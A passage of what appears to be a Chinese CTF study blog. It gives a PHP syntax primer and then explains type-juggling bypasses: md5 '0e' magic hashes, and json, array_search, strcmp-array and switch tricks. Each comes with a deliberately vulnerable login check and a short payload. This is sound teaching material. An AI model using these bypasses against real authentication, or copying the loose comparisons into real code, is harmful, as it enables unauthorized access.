显示或设置系统时间。</span><br><span class="line"><span class="built_in">TITLE</span>          设置 <span class="built_in">CMD</span>.EXE 会话的窗口标题。</span><br><span class="line"><span class="built_in">TREE</span>           以图形方式显示驱动程序或路径的目录</span><br><span class="line">               结构。</span><br><span class="line"><span class="built_in">TYPE</span>           显示文本文件的内容。</span><br><span class="line"><span class="built_in">VER</span>            显示 Windows 的版本。</span><br><span class="line"><span class="built_in">VERIFY</span>         告诉 Windows 是否进行验证，以确保文件</span><br><span class="line">               正确写入磁盘。</span><br><span class="line"><span class="built_in">VOL</span>            显示磁盘卷标和序列号。</span><br><span class="line"><span class="built_in">XCOPY</span>          复制文件和目录树。</span><br><span class="line">WMIC           在交互式命令 shell 中显示 WMI 信息。</span><br></pre></td></tr></table></figure><h2 id="php语法快速入门（看得懂就行版本）"><a href="#php语法快速入门（看得懂就行版本）" class="headerlink" title="php语法快速入门（看得懂就行版本）"></a>php语法快速入门（看得懂就行版本）</h2><p>当你开始学习 PHP 语法时，以下是一些基本概念和语法规则，可以帮助你快速入门：</p><ol><li>语法标记：PHP 代码通常包含在 <code>&lt;?php</code> 和 <code>?&gt;</code> 标记之间。例如：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// PHP 代码在这里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>注释：使用注释可以在代码中添加说明性文字，对于自己和其他人来说都很有用。PHP 支持单行注释和多行注释。例如：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这是单行注释</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这是</span></span><br><span class="line"><span class="comment">多行注释</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><ol start="3"><li>变量：用于存储和操作数据的容器。在 PHP 中，变量以美元符号 <code>$</code> 开头，后面跟着变量名。变量名可以包含字母、数字和下划线，但必须以字母或下划线开头。PHP 是一种弱类型语言，变量的类型会根据赋值的内容自动确定。例如：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="string">&quot;John&quot;</span>; <span class="comment">// 字符串类型的变量</span></span><br><span class="line"><span class="variable">$age</span> = <span class="number">25</span>; <span class="comment">// 整数类型的变量</span></span><br></pre></td></tr></table></figure><ol start="4"><li>数据类型：PHP 支持多种数据类型，包括字符串、整数、浮点数、布尔值、数组、对象等。根据需要，你可以根据数据类型执行相应的操作。例如：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Hello&quot;</span>; <span class="comment">// 字符串类型</span></span><br><span class="line"><span class="variable">$num</span> = <span class="number">10</span>; <span class="comment">// 整数类型</span></span><br><span class="line"><span class="variable">$pi</span> = <span class="number">3.14</span>; <span class="comment">// 浮点数类型</span></span><br><span class="line"><span class="variable">$isTrue</span> = <span class="literal">true</span>; <span class="comment">// 布尔值类型</span></span><br></pre></td></tr></table></figure><ol start="5"><li>输出内容：使用 <code>echo</code> 或 <code>print</code> 关键字可以将内容输出到浏览器。例如：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello, World!&quot;</span>; <span class="comment">// 输出字符串</span></span><br><span class="line"><span class="variable">$num</span> = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num</span>; <span class="comment">// 输出变量的值</span></span><br></pre></td></tr></table></figure><ol start="6"><li>条件语句：使用条件语句可以根据条件的真假执行不同的代码块。常见的条件语句有 <code>if</code>、<code>else if</code> 和 <code>else</code>。例如：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$age</span> = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$age</span> &lt; <span class="number">18</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;未成年人&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$age</span> &gt;= <span class="number">18</span> &amp;&amp; <span class="variable">$age</span> &lt; <span class="number">60</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;成年人&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;老年人&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="7"><li>循环语句：使用循环语句可以重复执行一段代码块。常见的循环语句有 <code>for</code>、<code>while</code> 和 <code>foreach</code>。例如：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">5</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$i</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$i</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$i</span> &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$i</span>;</span><br><span class="line">  <span class="variable">$i</span>++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$fruits</span> = <span class="keyword">array</span>(<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;Banana&quot;</span>, <span class="string">&quot;Orange&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$fruits</span> <span class="keyword">as</span> <span class="variable">$fruit</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$fruit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="8"><li>函数：<br>函数是封装了一段可重复使用的代码块。它可以接受参数并返回一个值。以下是一个简单的函数示例：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">greet</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Hello, &quot;</span> . <span class="variable">$name</span> . <span class="string">&quot;!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">greet</span>(<span class="string">&quot;John&quot;</span>); <span class="comment">// 调用函数并传递参数</span></span><br></pre></td></tr></table></figure><ol start="9"><li>数组：<br>数组是用于存储多个值的数据结构。在 PHP 中，数组可以包含不同类型的值，并且可以通过索引或关联键进行访问。以下是一个简单的数组示例：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fruits</span> = <span class="keyword">array</span>(<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;Banana&quot;</span>, <span class="string">&quot;Orange&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fruits</span>[<span class="number">0</span>]; <span class="comment">// 输出数组的第一个元素</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$person</span> = <span class="keyword">array</span>(</span><br><span class="line">  <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;John&quot;</span>,</span><br><span class="line">  <span class="string">&quot;age&quot;</span> =&gt; <span class="number">25</span>,</span><br><span class="line">  <span class="string">&quot;city&quot;</span> =&gt; <span class="string">&quot;New York&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$person</span>[<span class="string">&quot;name&quot;</span>]; <span class="comment">// 输出数组中关联键为 &quot;name&quot; 的值</span></span><br></pre></td></tr></table></figure><ol start="10"><li>类：<br>类是面向对象编程的核心概念之一，用于封装数据和功能。一个类定义了一种对象的行为和属性。以下是一个简单的类示例：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">greet</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello, my name is &quot;</span> . <span class="variable language_">$this</span>-&gt;name . <span class="string">&quot; and I am &quot;</span> . <span class="variable language_">$this</span>-&gt;age . <span class="string">&quot; years old.&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John&quot;</span>, <span class="number">25</span>); <span class="comment">// 创建一个 Person 对象</span></span><br><span class="line"><span class="variable">$person</span>-&gt;<span class="title function_ invoke__">greet</span>(); <span class="comment">// 调用类的方法</span></span><br></pre></td></tr></table></figure><p>在上面的示例中，<code>Person</code> 类具有 <code>name</code> 和 <code>age</code> 两个属性，以及 <code>__construct()</code> 构造函数和 <code>greet()</code> 方法。使用 <code>new</code> 关键字可以实例化一个类，并通过 <code>-&gt;</code> 运算符访问类的属性和方法。</p><h2 id="php中的奇技淫巧"><a href="#php中的奇技淫巧" class="headerlink" title="php中的奇技淫巧"></a>php中的奇技淫巧</h2><h3 id="php弱类型与强类型"><a href="#php弱类型与强类型" class="headerlink" title="php弱类型与强类型"></a>php弱类型与强类型</h3><h4 id="x3D-x3D-与-x3D-x3D-x3D"><a href="#x3D-x3D-与-x3D-x3D-x3D" class="headerlink" title="&#x3D;&#x3D; 与 &#x3D;&#x3D;&#x3D;"></a>&#x3D;&#x3D; 与 &#x3D;&#x3D;&#x3D;</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a == $b ;</span><br><span class="line">	$a === $b ;</span><br><span class="line">?&gt;  </span><br><span class="line">//=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较</span><br><span class="line">// == 在进行比较的时候，会先将字符串类型转化成相同，再比较</span><br></pre></td></tr></table></figure><p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(&quot;admin&quot; == 0); //true</span><br><span class="line">var_dump(&quot;1admin&quot;== 1); //true</span><br><span class="line">var_dump(&quot;admin1&quot;== 1); //false</span><br><span class="line">var_dump(&quot;admin1&quot;== 0); //true</span><br><span class="line">var_dump(&quot;0e123456&quot;==&quot;0e4456789&quot;); //true </span><br><span class="line">?&gt;  //上述代码可自行测试</span><br><span class="line">    </span><br><span class="line"> // 观察上述代码</span><br><span class="line"> //&quot;admin&quot;==0 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0自然和0相等</span><br><span class="line"> //&quot;1admin&quot;==1 比较的时候会将1admin转化成数值,结果为1，而“admin1“==1 却等于错误，即是&quot;admin1&quot;被转化成了0,为什么呢？？</span><br><span class="line"> //&quot;0e123456&quot;==&quot;0e456789&quot;相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等。</span><br></pre></td></tr></table></figure><p><code>php</code>手册：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">当一个字符串当作一个数值来取值，其结果和类型如下:如果该字符串没有包含&#x27;.&#x27;,&#x27;e&#x27;,&#x27;E&#x27;并且其数值值在整形的范围之内</span></span><br><span class="line"><span class="comment">该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">C</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="number">1</span> + <span class="string">&quot;10.5&quot;</span>; <span class="comment">// $test=11.5(float)</span></span><br><span class="line"><span class="variable">$test</span>=<span class="number">1</span>+<span class="string">&quot;-1.3e3&quot;</span>; <span class="comment">//$test=-1299(float)</span></span><br><span class="line"><span class="variable">$test</span>=<span class="number">1</span>+<span class="string">&quot;bob-1.3e3&quot;</span>;<span class="comment">//$test=1(int)</span></span><br><span class="line"><span class="variable">$test</span>=<span class="number">1</span>+<span class="string">&quot;2admin&quot;</span>;<span class="comment">//$test=3(int)</span></span><br><span class="line"><span class="variable">$test</span>=<span class="number">1</span>+<span class="string">&quot;admin2&quot;</span>;<span class="comment">//$test=1(int)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">So that<span class="string">&#x27;s why &quot; &quot;admin1&quot;==1 =&gt;False &quot;</span></span><br></pre></td></tr></table></figure><h4 id="md5绕过-Hash比较缺陷"><a href="#md5绕过-Hash比较缺陷" class="headerlink" title="md5绕过(Hash比较缺陷)"></a>md5绕过(Hash比较缺陷)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$logined</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$Username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;Username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$Username</span>)) &#123;<span class="variable">$logined</span> = <span class="literal">false</span>;&#125;</span><br><span class="line">     <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>) ) &#123;<span class="variable">$logined</span> = <span class="literal">false</span>;&#125;</span><br><span class="line">     <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$Username</span>) != <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>)) &#123;<span class="variable">$logined</span> = <span class="literal">false</span>;&#125;</span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$logined</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;successful&quot;</span>;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;login failed!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>大意是要输入一个字符串和数字类型，并且他们的md5值相等，就可以成功执行下一步语句</p><p>介绍一批md5开头是0e的字符串</p><p><strong>0e在比较的时候会将其视作为科学计数法</strong>，所以无论0e后面是什么，0的多少次方还是0。</p><p>键入**md5(‘240610708’) &#x3D;&#x3D; md5(‘QNKCDZO’)**成功绕过！</p><p>md5开头是0e的字符串（来源于网络）：</p><blockquote><p>QNKCDZO<br>0e830400451993494058024219903391</p><p>s878926199a<br>0e545993274517709034328855841020</p><p>s155964671a<br>0e342768416822451524974117254469</p><p>s214587387a<br>0e848240448830537924465865611904</p><p>s214587387a<br>0e848240448830537924465865611904</p><p>s878926199a<br>0e545993274517709034328855841020</p><p>s1091221200a<br>0e940624217856561557816327384675</p><p>s1885207154a<br>0e509367213418206700842008763514</p></blockquote><h4 id="json绕过"><a href="#json绕过" class="headerlink" title="json绕过"></a>json绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">    <span class="variable">$key</span> =<span class="string">&quot;*********&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$message</span>-&gt;key == <span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;~~~~&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输入一个json类型的字符串，json_decode函数解成一个数组，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，<strong>但是可以利用0&#x3D;&#x3D;”admin”这种形式绕过</strong>.</p><p>**最终payload **</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">message=<span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="array-search-is-array绕过"><a href="#array-search-is-array绕过" class="headerlink" title="array_search is_array绕过"></a>array_search is_array绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;<span class="keyword">exit</span>();&#125;</span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$test</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$test</span>[<span class="variable">$i</span>]===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$test</span>[<span class="variable">$i</span>]=<span class="title function_ invoke__">intval</span>(<span class="variable">$test</span>[<span class="variable">$i</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;admin&quot;</span>,<span class="variable">$test</span>)===<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;false&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先判断传入的是不是数组，然后循环遍历数组中的每个值，并且数组中的每个值不能和admin相等，并且将每个值转化为int类型，再判断传入的数组是否有admin，有则返回flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: test[]=<span class="number">0</span><span class="comment">//可以绕过</span></span><br></pre></td></tr></table></figure><p>官方手册对array_search的介绍</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">array_search</span> ( <span class="keyword">mixed</span> <span class="variable">$needle</span> , <span class="keyword">array</span> <span class="variable">$haystack</span> [], <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">false</span> )</span><br></pre></td></tr></table></figure><p><code>$needle，$haystack必需，$strict可选</code> 函数判断$haystack中的值是存在$needle，存在则返回该值的键值 第三个参数默认为false，如果设置为true则会进行严格过滤。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$a</span>=<span class="keyword">array</span>(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;admin&quot;</span>,<span class="variable">$a</span>));  <span class="comment">// int(0) ==&gt; 返回键值0</span></span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;1admin&quot;</span>,<span class="variable">$a</span>)); <span class="comment">// int(1) ==&gt; 返回键值1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>array_search函数 类似于 &#x3D;&#x3D; 也就是$a &#x3D;&#x3D;”admin” 当然是$a&#x3D;0 当然如果第三个参数为true则就不能绕过。</p><h4 id="strcmp漏洞绕过-php-v-lt-5-3"><a href="#strcmp漏洞绕过-php-v-lt-5-3" class="headerlink" title="strcmp漏洞绕过 php -v &lt;5.3"></a>strcmp漏洞绕过 php -v &lt;5.3</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$password</span>=<span class="string">&quot;***************&quot;</span></span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>], <span class="variable">$password</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Right!!!login success&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Wrong password..&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>strcmp是比较两个字符串，如果str1&lt;str2 则返回&lt;0 如果str1大于str2返回&gt;0 如果两者相等 返回0</li><li>我们是不知道$password的值的，题目要求strcmp判断的接受的值和$password必需相等，strcmp传入的期望类型是字符串类型，如果传入的是个数组会怎么样呢</li><li>我们传入 password[]&#x3D;xxx 可以绕过 是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等</li><li>payload: password[]&#x3D;xxx</li></ul><h4 id="switch绕过"><a href="#switch绕过" class="headerlink" title="switch绕过"></a>switch绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;4admin&quot;</span>;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$a</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;fail1&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;fail2&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;fail3&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;sucess&quot;</span>;  <span class="comment">//结果输出success;</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;failall&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>原理和上面一样</p><h4 id="is-numeric（）、int-强制类型转换"><a href="#is-numeric（）、int-强制类型转换" class="headerlink" 